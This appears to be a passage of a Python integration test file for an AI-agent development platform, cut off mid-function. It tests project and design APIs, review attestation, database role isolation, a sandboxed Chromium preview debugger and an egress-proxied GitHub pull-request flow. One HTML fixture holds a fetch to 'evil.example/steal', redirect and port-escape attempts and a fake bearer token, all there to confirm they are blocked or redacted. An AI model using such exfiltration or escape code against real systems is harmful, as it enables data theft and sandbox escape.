"""Phase 7 end-to-end & security boundary integration tests (DEV-01..DEV-14 on PostgreSQL 16 + Sentinel + Chromium).

Covers all 13 PR #122 review findings and regression checklist items:
1. Dev Projects, 3-candidate Design Picker, Demo Approval CAS invalidation on candidate switch (P1-06),
   PostgresReviewAttestationPort SUCCEEDED-run + persisted artifact verification (P1-07), and cross-owner/role isolation.
2. PreviewBroker attested instance registration (P0-02), Cycle-bound lease verification (P2-11),
   isolated Chromium worker subprocess with sanitized env + DNS/route/redirect confinement (P0-02),
   secret/CDP redaction, HTTP 500 capture, and mobile overflow detection (DEV-06).
3. Sentinel EgressProxy-enforced GitHub PR creation with canonical approved argument/digest binding +
   Path/Body digest enforcement (P0-01), remote branch HEAD & response head.sha verification (P1-04),
   post-send disconnect & malformed JSON -> EFFECT_UNKNOWN + Intent-level single-dispatch lock across
   different Idempotency-Keys (P1-03), Sentinel CONFIRMED GET unification (P1-05), production GitHub
   token provider without secret leaks (P2-13), PR Guardian HEAD/required-check verification (P1-09),
   and read-only vs atomic concurrent repair budget capping (P2-10).
4. Real Playwright Chromium UI E2E against built React Web UI `Development` tab served same-origin.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import secrets
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest
import uvicorn
from aiagent_api.app import create_app
from aiagent_core import admin, commands, control
from aiagent_core.commands import Scope
from aiagent_core.db import Database
from aiagent_core.egress_http import ForwardProxyError, send_via_forward_proxy
from aiagent_development.browser_debugger import _sanitized_worker_env
from aiagent_development.contracts import (
    CommitEvidence,
    Cycle,
    ExecutionEvidence,
    InvalidEvidence,
    Phase,
    ProjectScope,
    ReviewFinding,
    ReviewVerdict,
    RunFence,
    ScopeDenied,
    TaskPlan,
)
from aiagent_development.github_egress import canonical_pr_request, pr_request_sha256
from aiagent_development.pg_store import PostgresCycleStore, PreviewBroker
from aiagent_development.store import PostgresDevStore, PostgresReviewAttestationPort
from aiagent_domain import sha256_hex, uuid7
from aiagent_gateways.sentinel_port import LocalSentinel
from aiagent_sentinel.authority import EgressConfig, Sentinel
from aiagent_sentinel.egress import EgressProxy
from fastapi.testclient import TestClient
from psycopg.errors import InsufficientPrivilege

pytestmark = pytest.mark.pg


@pytest.fixture(autouse=True)
def _drain_phase7_outbox_rows(dbs: dict[str, Database]) -> Any:
    """Ensure Phase 7 tests leave no undispatched outbox rows for downstream queue/outbox tests."""
    yield
    with dbs["owner"].tx() as c:
        c.execute("UPDATE agent.outbox_messages SET dispatched_at = now() WHERE dispatched_at IS NULL")


def _run(coro: Any) -> Any:
    return asyncio.run(coro)


def _start_proxy_thread(
    sentinel: Sentinel, ecfg: EgressConfig, resolver: Any
) -> tuple[int, asyncio.AbstractEventLoop, threading.Thread, EgressProxy]:
    loop = asyncio.new_event_loop()
    ready = threading.Event()
    holder: dict[str, Any] = {}

    def runner() -> None:
        asyncio.set_event_loop(loop)

        async def boot() -> None:
            proxy = EgressProxy(sentinel, ecfg, resolver=resolver)
            port = await proxy.start("127.0.0.1", 0)
            holder["proxy"] = proxy
            holder["port"] = port
            ready.set()

        loop.run_until_complete(boot())
        loop.run_forever()
        loop.run_until_complete(holder["proxy"].close())
        loop.close()

    th = threading.Thread(target=runner, daemon=True)
    th.start()
    assert ready.wait(timeout=10), "egress proxy failed to start"
    return int(holder["port"]), loop, th, holder["proxy"]


def _start_uvicorn_thread(app: Any) -> tuple[int, uvicorn.Server, threading.Thread, socket.socket]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("127.0.0.1", 0))
    sock.listen(128)
    port = int(sock.getsockname()[1])
    cfg = uvicorn.Config(app, host="127.0.0.1", port=port, log_level="warning")
    server = uvicorn.Server(cfg)
    th = threading.Thread(target=lambda: server.run(sockets=[sock]), daemon=True)
    th.start()
    deadline = time.time() + 10.0
    while not server.started and time.time() < deadline:
        time.sleep(0.05)
    assert server.started, "uvicorn test server failed to start"
    return port, server, th, sock


def _seed_code_ready_cycle(
    dbs: dict[str, Database],
    tenant: dict[str, str],
    *,
    project_id: str,
    repository: str = "org/phase7-app",
    branch: str = "feat/p7-demo",
    cycle_id: str | None = None,
    commit_sha: str | None = None,
) -> tuple[str, str, dict[str, str], control.Claim, Cycle]:
    """Seed a real CODE_READY cycle with 3 independent reviewer verdicts for API/Preview/PR tests."""
    scope = Scope(tenant["tenantId"], tenant["userId"], tenant["workspaceId"])
    created = commands.submit_task(dbs["api"], scope, "phase7 build task", profile="sandbox")
    claim = control.claim_run(dbs["runtime"], scope.tenant_id, created["runId"], "dev-worker-p7")

    rev_tasks = [
        commands.submit_task(dbs["api"], scope, f"review-{role}", profile="sandbox")["taskId"]
        for role in ("functional", "security", "ui-e2e")
    ]
    base_sha = "1" * 40
    c_sha = commit_sha or ("2" * 40)
    diff_sha = sha256_hex({"diff": "phase7", "sha": c_sha})
    tc_sha = sha256_hex({"tc": "py313"})
    cid = cycle_id or f"cyc-{uuid7()[:12]}"

    ps = ProjectScope(
        tenant_id=scope.tenant_id,
        owner_user_id=scope.user_id,
        project_id=project_id,
        workspace_id=scope.workspace_id,
        repository=repository,
        branch=branch,
        base_sha=base_sha,
        workspace_revision="1",
    )
    rf = RunFence(
        task_id=claim.task_id,
        run_id=claim.run_id,
        goal_revision=claim.goal_revision,
        lease_epoch=claim.lease_epoch,
        restore_incarnation=claim.restore_incarnation,
        worker_ref=claim.worker_ref,
    )
    cycle = Cycle(
        cycle_id=cid,
        scope=ps,
        run=rf,
        phase=Phase.CODE_READY,
        change_request_ref="cr-p7-1",
        version=5,
        plan=TaskPlan("plan-1", "cr-p7-1", ("test_main",), claim.goal_revision),
        commit=CommitEvidence(base_sha, c_sha, diff_sha, "art-diff-1", "git:receipt-1"),
        tests=(
            ExecutionEvidence(
                intent_ref="test-intent-1",
                run=rf,
                kind="test",
                exit_code=0,
                executed=True,
                artifact_sha256=sha256_hex({"out": "ok"}),
                toolchain_digest=tc_sha,
                stdout="1 passed",
                stderr="",
                source_commit_sha=c_sha,
                test_id="test_main",
                receipt_ref="rcpt-t1",
                timed_out=False,
                truncated=False,
            ),
        ),
        reviews=(
            ReviewVerdict(rev_tasks[0], "functional", c_sha, True, uuid7()),
            ReviewVerdict(rev_tasks[1], "security", c_sha, True, uuid7()),
            ReviewVerdict(rev_tasks[2], "ui-e2e", c_sha, True, uuid7()),
        ),
    )
    PostgresCycleStore(dbs["api"]).create(cycle)
    return cid, c_sha, created, claim, cycle


def _seed_approved_pr_intent(
    dbs: dict[str, Database],
    tenant: dict[str, str],
    *,
    task_id: str,
    run_id: str,
    goal_revision: int,
    project_id: str,
    cycle_id: str,
    repository: str,
    branch: str,
    head_sha: str,
    base_branch: str = "main",
    title: str = "Autonomous development PR",
    body: str = "Created under bounded development workflow.",
    draft: bool = True,
    approved: bool = True,
) -> tuple[str, str]:
    intent_id = uuid7()
    args = canonical_pr_request(
        project_id=project_id,
        cycle_id=cycle_id,
        repository=repository,
        branch=branch,
        head_sha=head_sha,
        base_branch=base_branch,
        title=title,
        body=body,
        draft=draft,
    )
    req_sha = pr_request_sha256(args)
    with dbs["owner"].tx() as c:
        c.execute(
            "INSERT INTO agent.tool_intents(tenant_id, id, task_id, run_id, tool_key, invocation_key,"
            " request_sha256, safe_arguments_json, risk_class, goal_revision, status_code)"
            " VALUES (%s,%s,%s,%s,'dev_github_pr',%s,%s,%s::jsonb,'external_irreversible',%s,'SENDING')",
            (
                tenant["tenantId"],
                intent_id,
                task_id,
                run_id,
                f"pr-inv-{intent_id}",
                req_sha,
                json.dumps(args),
                goal_revision,
            ),
        )
        if approved:
            c.execute(
                "INSERT INTO agent.approval_records(tenant_id, id, tool_intent_id, task_id, run_id, owner_user_id,"
                " tool_key, request_sha256, goal_revision, safe_summary, decision_code, expires_at)"
                " VALUES (%s,%s,%s,%s,%s,%s,'dev_github_pr',%s,%s,'create draft PR','APPROVED',now() + interval '1h')",
                (
                    tenant["tenantId"],
                    uuid7(),
                    intent_id,
                    task_id,
                    run_id,
                    tenant["userId"],
                    req_sha,
                    goal_revision,
                ),
            )
    return intent_id, req_sha


def test_phase7_projects_design_demo_reviews_and_owner_isolation(
    pg: Any, dbs: dict[str, Database], tenant: dict[str, str]
) -> None:
    """DEV-01/02/03/07/09 + P1-06 + P1-07: prefs, Demo invalidation on design switch, strict review attestation, RLS."""
    other = admin.provision_tenant(pg.owner)
    app = create_app(dbs["api"])
    h_a = {"Authorization": f"Bearer {tenant['token']}"}
    h_b = {"Authorization": f"Bearer {other['token']}"}

    # DB role isolation: sentinel/relay must NOT have access to new dev_* tables
    with pytest.raises(InsufficientPrivilege):
        dbs["sentinel"].one("SELECT id FROM agent.dev_projects LIMIT 1")
    with pytest.raises(InsufficientPrivilege):
        dbs["relay"].one("SELECT id FROM agent.dev_pr_records LIMIT 1")
    with pytest.raises(InsufficientPrivilege):
        dbs["sentinel"].one("SELECT id FROM agent.dev_preview_instances LIMIT 1")
    with pytest.raises(InsufficientPrivilege):
        dbs["relay"].one("SELECT id FROM agent.dev_review_artifacts LIMIT 1")

    with TestClient(app) as client:
        # Legacy ambiguous demoChoice=AUTO is rejected 422
        r_bad = client.post(
            "/v1/development/projects",
            headers=h_a,
            json={
                "projectId": "proj-bad",
                "name": "Bad Prefs",
                "repository": "org/phase7-app",
                "preferences": {"demoChoice": "AUTO"},
            },
        )
        assert r_bad.status_code == 422
        assert "DEPRECATED_DEMO_CHOICE_AUTO" in r_bad.text

        # Valid project creation with explicit AUTO_RECOMMEND + REQUIRE_USER_APPROVAL
        r_proj = client.post(
            "/v1/development/projects",
            headers=h_a,
            json={
                "projectId": "proj-p7-1",
                "name": "Phase7 Demo App",
                "repository": "org/phase7-app",
                "defaultBranch": "main",
                "framework": "web",
                "preferences": {
                    "designPolicy": "AUTO_RECOMMEND",
                    "demoAcceptancePolicy": "REQUIRE_USER_APPROVAL",
                    "releasePolicy": "PR_AFTER_APPROVED_SCOPE",
                },
            },
        )
        assert r_proj.status_code == 201, r_proj.text
        proj_id = r_proj.json()["project"]["id"]

        # Cross-tenant owner cannot read project (404)
        assert client.get(f"/v1/development/projects/{proj_id}", headers=h_b).status_code == 404

        cycle_id, commit_sha, _, claim, _ = _seed_code_ready_cycle(dbs, tenant, project_id=proj_id)

        # P1-07: PostgresReviewAttestationPort strictly requires SUCCEEDED independent run + persisted review artifact
        attest = PostgresReviewAttestationPort(dbs["api"])
        dev_store = PostgresDevStore(dbs["api"])
        proj_scope = ProjectScope(
            tenant["tenantId"],
            tenant["userId"],
            proj_id,
            tenant["workspaceId"],
            "org/phase7-app",
            "feat/p7-demo",
            "1" * 40,
            "1",
        )
        builder_fence = RunFence(
            claim.task_id,
            claim.run_id,
            claim.goal_revision,
            claim.lease_epoch,
            claim.restore_incarnation,
            claim.worker_ref,
        )
        # 1) Self-review rejected
        with pytest.raises(ScopeDenied, match="self-review"):
            attest.assert_verified(
                proj_scope, builder_fence, ReviewVerdict(claim.task_id, "functional", commit_sha, True, uuid7())
            )
        # 2) Non-uuid7 evidence_ref rejected
        indep = commands.submit_task(
            dbs["api"], Scope(tenant["tenantId"], tenant["userId"], tenant["workspaceId"]), "indep-review"
        )
        with pytest.raises(InvalidEvidence, match="dev_review_artifacts"):
            attest.assert_verified(
                proj_scope, builder_fence, ReviewVerdict(indep["taskId"], "security", commit_sha, True, "ev-not-uuid")
            )
        # 3) Non-existent artifact uuid7 rejected
        with pytest.raises(ScopeDenied, match="review artifact"):
            attest.assert_verified(
                proj_scope, builder_fence, ReviewVerdict(indep["taskId"], "security", commit_sha, True, uuid7())
            )
        # 4) Artifact exists, but reviewer Run is NOT SUCCEEDED (QUEUED or FAILED) -> rejected
        art_id = dev_store.record_review_artifact(
            tenant_id=tenant["tenantId"],
            owner_user_id=tenant["userId"],
            project_id=proj_id,
            cycle_id=cycle_id,
            task_id=indep["taskId"],
            run_id=indep["runId"],
            reviewer_role="security",
            target_sha=commit_sha,
            evidence_sha256=sha256_hex({"report": "ok"}),
            passed=True,
            findings=[{"findingId": "f1", "severity": "P2", "status": "RESOLVED"}],
        )
        with pytest.raises(ScopeDenied, match="did not SUCCEED"):
            attest.assert_verified(
                proj_scope,
                builder_fence,
                ReviewVerdict(indep["taskId"], "security", commit_sha, True, art_id),
            )
        failed_rev = commands.submit_task(
            dbs["api"], Scope(tenant["tenantId"], tenant["userId"], tenant["workspaceId"]), "failed-review"
        )
        failed_art = dev_store.record_review_artifact(
            tenant_id=tenant["tenantId"],
            owner_user_id=tenant["userId"],
            project_id=proj_id,
            cycle_id=cycle_id,
            task_id=failed_rev["taskId"],
            run_id=failed_rev["runId"],
            reviewer_role="security",
            target_sha=commit_sha,
            evidence_sha256=sha256_hex({"report": "failed"}),
            passed=True,
        )
        with dbs["owner"].tx() as c:
            c.execute(
                "UPDATE agent.runs SET status_code='FAILED' WHERE tenant_id=%s AND id=%s",
                (tenant["tenantId"], failed_rev["runId"]),
            )
        with pytest.raises(ScopeDenied, match="did not SUCCEED"):
            attest.assert_verified(
                proj_scope,
                builder_fence,
                ReviewVerdict(failed_rev["taskId"], "security", commit_sha, True, failed_art),
            )
        # 5) Transition reviewer Run to SUCCEEDED -> exact match passes; mismatched SHA/role still rejected
        with dbs["owner"].tx() as c:
            c.execute(
                "UPDATE agent.runs SET status_code='SUCCEEDED' WHERE tenant_id=%s AND id=%s",
                (tenant["tenantId"], indep["runId"]),
            )
        with pytest.raises(ScopeDenied, match="mismatched"):
            attest.assert_verified(
                proj_scope,
                builder_fence,
                ReviewVerdict(indep["taskId"], "functional", commit_sha, True, art_id),
            )
        attest.assert_verified(
            proj_scope,
            builder_fence,
            ReviewVerdict(
                indep["taskId"], "security", commit_sha, True, art_id, (ReviewFinding("f1", "P2", "RESOLVED"),)
            ),
        )

        # GET reviews confirms 3 SHA-pinned independent roles and 0 open P0/P1
        r_rev = client.get(f"/v1/development/cycles/{cycle_id}/reviews", headers=h_a)
        assert r_rev.status_code == 200
        assert r_rev.json()["allThreeRolesPresent"] is True
        assert r_rev.json()["openP0P1Count"] == 0

        # 3-candidate Design proposal under AUTO_RECOMMEND NEVER auto-selects or auto-approves
        r_des = client.post(
            f"/v1/development/cycles/{cycle_id}/design",
            headers=h_a,
            json={
                "candidates": [
                    {
                        "candidateId": "win11",
                        "label": "Windows 11",
                        "fixtureRef": "fixture://dash-1",
                        "summary": "Clean fluent",
                    },
                    {
                        "candidateId": "minimal",
                        "label": "Minimal",
                        "fixtureRef": "fixture://dash-1",
                        "summary": "High contrast",
                    },
                    {
                        "candidateId": "dense",
                        "label": "Dense Pro",
                        "fixtureRef": "fixture://dash-1",
                        "summary": "Compact ops",
                    },
                ]
            },
        )
        assert r_des.status_code == 201, r_des.text
        des = r_des.json()["design"]
        assert des["recommendedCandidateId"] == "win11"
        assert des["selectedCandidateId"] is None
        assert des["demoDecision"] == "PENDING"
        initial_digest = des["demoSnapshotDigest"]

        # Approving Demo before selecting a candidate fails 409
        r_premature = client.post(
            f"/v1/development/cycles/{cycle_id}/demo-decision",
            headers=h_a,
            json={"designRevision": 1, "decision": "APPROVED", "demoSnapshotDigest": initial_digest},
        )
        assert r_premature.status_code == 409

        # Stale designRevision rejected 409
        r_stale = client.post(
            f"/v1/development/cycles/{cycle_id}/design-decision",
            headers=h_a,
            json={"designRevision": 99, "selectedCandidateId": "minimal"},
        )
        assert r_stale.status_code == 409

        # Select candidate 'minimal' -> digest now binds selectedCandidateId='minimal'
        r_sel = client.post(
            f"/v1/development/cycles/{cycle_id}/design-decision",
            headers=h_a,
            json={"designRevision": 1, "selectedCandidateId": "minimal", "feedback": "Good readability"},
        )
        assert r_sel.status_code == 200 and r_sel.json()["design"]["selectedCandidateId"] == "minimal"
        digest_minimal = r_sel.json()["design"]["demoSnapshotDigest"]
        assert digest_minimal != initial_digest

        # Old pre-selection digest rejected 409
        assert (
            client.post(
                f"/v1/development/cycles/{cycle_id}/demo-decision",
                headers=h_a,
                json={"designRevision": 1, "decision": "APPROVED", "demoSnapshotDigest": initial_digest},
            ).status_code
            == 409
        )

        # Approve Demo with minimal's bound digest (explicitly grantsExternalApproval=False)
        r_demo = client.post(
            f"/v1/development/cycles/{cycle_id}/demo-decision",
            headers=h_a,
            json={"designRevision": 1, "decision": "APPROVED", "demoSnapshotDigest": digest_minimal},
        )
        assert r_demo.status_code == 200
        assert r_demo.json()["design"]["demoDecision"] == "APPROVED"
        assert r_demo.json()["grantsExternalApproval"] is False

        # P1-06: Switching selected candidate to 'dense' MUST invalidate Demo APPROVED -> PENDING and rotate digest
        r_switch = client.post(
            f"/v1/development/cycles/{cycle_id}/design-decision",
            headers=h_a,
            json={"designRevision": 1, "selectedCandidateId": "dense", "feedback": "Switch after demo"},
        )
        assert r_switch.status_code == 200
        switched = r_switch.json()["design"]
        assert switched["selectedCandidateId"] == "dense"
        assert switched["demoDecision"] == "PENDING"
        digest_dense = switched["demoSnapshotDigest"]
        assert digest_dense != digest_minimal

        # Replaying old minimal digest is rejected 409; approving with dense digest succeeds
        assert (
            client.post(
                f"/v1/development/cycles/{cycle_id}/demo-decision",
                headers=h_a,
                json={"designRevision": 1, "decision": "APPROVED", "demoSnapshotDigest": digest_minimal},
            ).status_code
            == 409
        )
        r_reapp = client.post(
            f"/v1/development/cycles/{cycle_id}/demo-decision",
            headers=h_a,
            json={"designRevision": 1, "decision": "APPROVED", "demoSnapshotDigest": digest_dense},
        )
        assert r_reapp.status_code == 200 and r_reapp.json()["design"]["demoDecision"] == "APPROVED"


def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
    dbs: dict[str, Database], tenant: dict[str, str], monkeypatch: pytest.MonkeyPatch
) -> None:
    """DEV-06 + P0-02 + P2-11: Preview attestation, Cycle lease binding, isolated Chromium DNS/redirect confinement."""
    pytest.importorskip("playwright.async_api")

    # P0-02: Verify worker subprocess env sanitizer strips all AIAGENT_* secrets/DSNs
    monkeypatch.setenv("AIAGENT_TEST_SECRET_LEAK", "must-never-reach-browser-worker")
    sanitized = _sanitized_worker_env()
    assert "AIAGENT_TEST_SECRET_LEAK" not in sanitized
    assert not any(k.startswith("AIAGENT_") for k in sanitized)

    escape_hits: list[str] = []

    class _EscapeReceiver(BaseHTTPRequestHandler):
        def log_message(self, fmt: str, *args: Any) -> None:
            del fmt, args

        def do_GET(self) -> None:
            escape_hits.append(self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"escaped")

    escape_srv = ThreadingHTTPServer(("127.0.0.1", 0), _EscapeReceiver)
    threading.Thread(target=escape_srv.serve_forever, daemon=True).start()
    escape_port = escape_srv.server_address[1]

    class _PreviewHandler(BaseHTTPRequestHandler):
        def log_message(self, fmt: str, *args: Any) -> None:
            del fmt, args

        def do_GET(self) -> None:
            if self.path == "/api/broken":
                self.send_response(500)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error":"boom"}')
                return
            if self.path == "/redirect-escape":
                self.send_response(302)
                self.send_header("Location", f"http://127.0.0.1:{escape_port}/escaped")
                self.end_headers()
                return
            html = (
                "<!doctype html><html><body style='margin:0'>"
                "<div style='width:900px;height:40px'>Wide mobile overflow</div>"
                "<iframe src='/redirect-escape'></iframe>"
                "<script>"
                "console.error('Auth failed Bearer super_secret_token_999 ws://127.0.0.1:9222/devtools/page/abc');"
                "fetch('/api/broken');"
                "fetch('http://evil.example/steal').catch(() => {});"
                f"fetch('http://127.0.0.1:{escape_port}/direct-port-escape').catch(() => {{}});"
                "</script></body></html>"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html)

    srv = ThreadingHTTPServer(("127.0.0.1", 0), _PreviewHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    srv_port = srv.server_address[1]

    app = create_app(dbs["api"])
    headers = {"Authorization": f"Bearer {tenant['token']}"}

    try:
        with TestClient(app) as client:
            r_p = client.post(
                "/v1/development/projects",
                headers=headers,
                json={"projectId": "proj-dbg-1", "name": "Debug App", "repository": "org/dbg-app"},
            )
            assert r_p.status_code == 201
            cycle_a, _, _, _, cycle_a_obj = _seed_code_ready_cycle(
                dbs, tenant, project_id="proj-dbg-1", repository="org/dbg-app"
            )
            cycle_b, _, _, _, _ = _seed_code_ready_cycle(
                dbs, tenant, project_id="proj-dbg-1", repository="org/dbg-app", commit_sha="3" * 40
            )

            # P0-02: Issuing preview lease for an unregistered arbitrary port is strictly denied 403
            r_unreg = client.post(
                f"/v1/development/cycles/{cycle_a}/previews",
                headers=headers,
                json={"targetPort": srv_port, "ttlSeconds": 120},
            )
            assert r_unreg.status_code == 403

            # Register attested preview instance for Cycle A on srv_port
            inst_id = PreviewBroker(dbs["api"]).register_instance(
                cycle_a_obj,
                target_port=srv_port,
                process_attestation_sha256=sha256_hex({"cycle": cycle_a, "port": srv_port}),
            )

            r_lease = client.post(
                f"/v1/development/cycles/{cycle_a}/previews",
                headers=headers,
                json={"targetPort": srv_port, "ttlSeconds": 120, "previewInstanceId": inst_id},
            )
            assert r_lease.status_code == 201, r_lease.text
            lease_id = r_lease.json()["leaseId"]
            token = r_lease.json()["previewToken"]

            # P2-11: Passing Cycle A's valid PreviewLease to Cycle B's debug endpoint is rejected 403
            r_wrong_cycle = client.post(
                f"/v1/development/cycles/{cycle_b}/debug",
                headers=headers,
                json={
                    "leaseId": lease_id,
                    "previewToken": token,
                    "targetPort": srv_port,
                    "path": "/",
                    "revokeAfter": False,
                },
            )
            assert r_wrong_cycle.status_code == 403

            # observe mode rejects typing/input
            r_obs_bad = client.post(
                f"/v1/development/previews/{lease_id}/commands",
                headers=headers,
                json={"action": "observe", "previewToken": token, "targetPort": srv_port, "input": "hello"},
            )
            assert r_obs_bad.status_code == 403

            # observe read-only & synthetic_interact succeed without CDP exposure
            r_obs_ok = client.post(
                f"/v1/development/previews/{lease_id}/commands",
                headers=headers,
                json={"action": "observe", "previewToken": token, "targetPort": srv_port, "cycleId": cycle_a},
            )
            assert r_obs_ok.status_code == 200 and r_obs_ok.json()["cdpExposed"] is False

            r_syn = client.post(
                f"/v1/development/previews/{lease_id}/commands",
                headers=headers,
                json={
                    "action": "synthetic_interact",
                    "syntheticAction": "toggle_theme",
                    "previewToken": token,
                    "targetPort": srv_port,
                    "cycleId": cycle_a,
                },
            )
            assert r_syn.status_code == 200 and r_syn.json()["syntheticFixtureOnly"] is True

            # Real isolated Playwright worker debug probe:
            # - redacts console secrets & CDP URLs
            # - captures HTTP 500 and mobile overflow
            # - blocks external egress (evil.example) AND cross-port redirect/fetch to escape_port (0 hits!)
            r_dbg = client.post(
                f"/v1/development/cycles/{cycle_a}/debug",
                headers=headers,
                json={
                    "leaseId": lease_id,
                    "previewToken": token,
                    "targetPort": srv_port,
                    "path": "/",
                    "revokeAfter": True,
                },
            )
            assert r_dbg.status_code == 201, r_dbg.text
            finding = r_dbg.json()["finding"]
            assert finding["status"] == "OPEN"
            assert any("[REDACTED]" in msg for msg in finding["consoleErrors"])
            assert all(
                "super_secret_token_999" not in msg and "devtools" not in msg for msg in finding["consoleErrors"]
            )
            assert any("HTTP 500 /api/broken" in msg for msg in finding["networkErrors"])
            assert any("BLOCKED_EGRESS" in msg for msg in finding["networkErrors"])
            assert any("BLOCKED_REDIRECT" in msg for msg in finding["networkErrors"])
            assert escape_hits == [], f"Browser worker escaped leased origin: {escape_hits}"
            assert any("[mobile] horizontal overflow" in msg for msg in finding["layoutIssues"])

            # Lease is revoked after debug -> subsequent observe command fails 403
            r_after = client.post(
                f"/v1/development/previews/{lease_id}/commands",
                headers=headers,
                json={"action": "observe", "previewToken": token, "targetPort": srv_port},
            )
            assert r_after.status_code == 403
    finally:
        srv.shutdown()
        srv.server_close()
        escape_srv.shutdown()
        escape_srv.server_close()


def test_phase7_sentinel_github_pr_effect_unknown_reconcile_and_guardian_limit(
    dbs: dict[str, Database], tenant: dict[str, str], monkeypatch: pytest.MonkeyPatch
) -> None:
    """DEV-05 / DEV-11 + P0-01/P1-03/P1-04/P1-05/P1-09/P2-10/P2-13 comprehensive Sentinel Egress integration."""
    post_hits: list[dict[str, Any]] = []
    seen_auth_headers: list[str] = []
    created_prs: list[dict[str, Any]] = []
    gh_state: dict[str, Any] = {
        "remote_ref_sha": "2" * 40,
        "pr_response_head_sha": "2" * 40,
        "live_pr_head_sha": "2" * 40,
        "post_mode": "drop",  # drop | malformed_json | normal
        "check_runs": [{"name": "integration-pytest", "status": "completed", "conclusion": "failure"}],
        "commit_statuses": [{"context": "ci/policy", "state": "success"}],
    }

    async def _gh_receiver(r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
        try:
            head = await asyncio.wait_for(r.readuntil(b"\r\n\r\n"), timeout=5.0)
            lines = head[:-4].decode("latin-1").split("\r\n")
            method, path, _ = lines[0].split(" ", 2)
            cl = 0
            for ln in lines[1:]:
                k, _, v = ln.partition(":")
                kl = k.lower().strip()
                if kl == "content-length":
                    cl = int(v.strip())
                elif kl == "authorization":
                    seen_auth_headers.append(v.strip())
            raw = await asyncio.wait_for(r.readexactly(cl), timeout=5.0) if cl else b""

            if method == "GET" and path == "/repos/org/gh-app/git/ref/heads/feat/p7-demo":
                resp = json.dumps(
                    {"ref": "refs/heads/feat/p7-demo", "object": {"sha": gh_state["remote_ref_sha"]}}
                ).encode("utf-8")
                w.write(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
                    % (len(resp), resp)
                )
                await w.drain()
                return

            if method == "POST" and path == "/repos/org/gh-app/pulls":
                body_obj = json.loads(raw.decode("utf-8"))
                # Realistic GitHub API: NEVER trusts synthetic head_sha; uses remote ref/configured SHA
                assert "head_sha" not in body_obj
                post_hits.append(body_obj)
                pr_num = 42 + len(created_prs)
                pr_obj = {
                    "number": pr_num,
                    "html_url": f"https://github.test/org/gh-app/pull/{pr_num}",
                    "state": "open",
                    "draft": bool(body_obj.get("draft", True)),
                    "mergeable": True,
                    "mergeable_state": "unstable",
                    "head": {"sha": gh_state["pr_response_head_sha"], "ref": body_obj["head"]},
                }
                created_prs.append(pr_obj)
                mode = gh_state["post_mode"]
                if mode == "drop":
                    gh_state["post_mode"] = "normal"
                    w.close()
                    return
                if mode == "malformed_json":
                    gh_state["post_mode"] = "normal"
                    bad = b"{not-valid-json"
                    w.write(
                        b"HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
                        % (len(bad), bad)
                    )
                    await w.drain()
                    return
                resp = json.dumps(pr_obj).encode("utf-8")
                w.write(
                    b"HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
                    % (len(resp), resp)
                )
                await w.drain()
                return

            if method == "GET" and path.startswith("/repos/org/gh-app/pulls?"):
                resp = json.dumps(created_prs).encode("utf-8")
                w.write(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
                    % (len(resp), resp)
                )
                await w.drain()
                return

            if method == "GET" and path == "/repos/org/gh-app/pulls/42":
                live_pr = {
                    **created_prs[0],
                    "head": {"sha": gh_state["live_pr_head_sha"], "ref": "feat/p7-demo"},
                }
                resp = json.dumps(live_pr).encode("utf-8")
                w.write(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
                    % (len(resp), resp)
                )
                await w.drain()
                return

            if method == "GET" and "/check-runs" in path:
                runs = gh_state["check_runs"]
                resp = json.dumps({"total_count": len(runs), "check_runs": runs}).encode("utf-8")
                w.write(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
                    % (len(resp), resp)
                )
                await w.drain()
                return

            if method == "GET" and path.endswith("/status"):
                resp = json.dumps({"statuses": gh_state["commit_statuses"]}).encode("utf-8")
                w.write(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
                    % (len(resp), resp)
                )
                await w.drain()
                return

            w.write(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
            await w.drain()
        finally:
            w.close()

    loop = asyncio.new_event_loop()
    ready = threading.Event()
    holder: dict[str, Any] = {}

    def _run_gh_srv() -> None:
        asyncio.set_event_loop(loop)

        async def _boot() -> None:
            srv = await asyncio.start_server(_gh_receiver, "127.0.0.1", 0)
            holder["srv"] = srv
            holder["port"] = srv.sockets[0].getsockname()[1]
            ready.set()

        loop.run_until_complete(_boot())
        loop.run_forever()
        holder["srv"].close()
        loop.run_until_complete(holder["srv"].wait_closed())
        loop.close()

    gh_th = threading.Thread(target=_run_gh_srv, daemon=True)
    gh_th.start()
    assert ready.wait(timeout=10)
    gh_port = int(holder["port"])

    async def _resolve(host: str, port_num: int) -> list[str]:
        del port_num
        return ["127.0.0.1"] if host == "api.github.test" else []

    ecfg = EgressConfig.from_json(
        json.dumps(
            {
                "destinations": {
                    "github-api": {
                        "scheme": "http",
                        "host": "api.github.test",
                        "port": gh_port,
                        "methods": ["GET", "POST"],
                        "allow_private": ["127.0.0.1"],
                    }
                }
            }
        ),
        production=False,
    )
    sentinel = Sentinel(dbs["sentinel"], ecfg, secrets.token_bytes(32))
    proxy_port, proxy_loop, proxy_thread, _ = _start_proxy_thread(sentinel, ecfg, _resolve)
    proxy_url = f"http://127.0.0.1:{proxy_port}"
    monkeypatch.setenv("AIAGENT_EGRESS_PROXY", proxy_url)
    # P2-13: production token provider sourced from env secret (never persisted in DB/events)
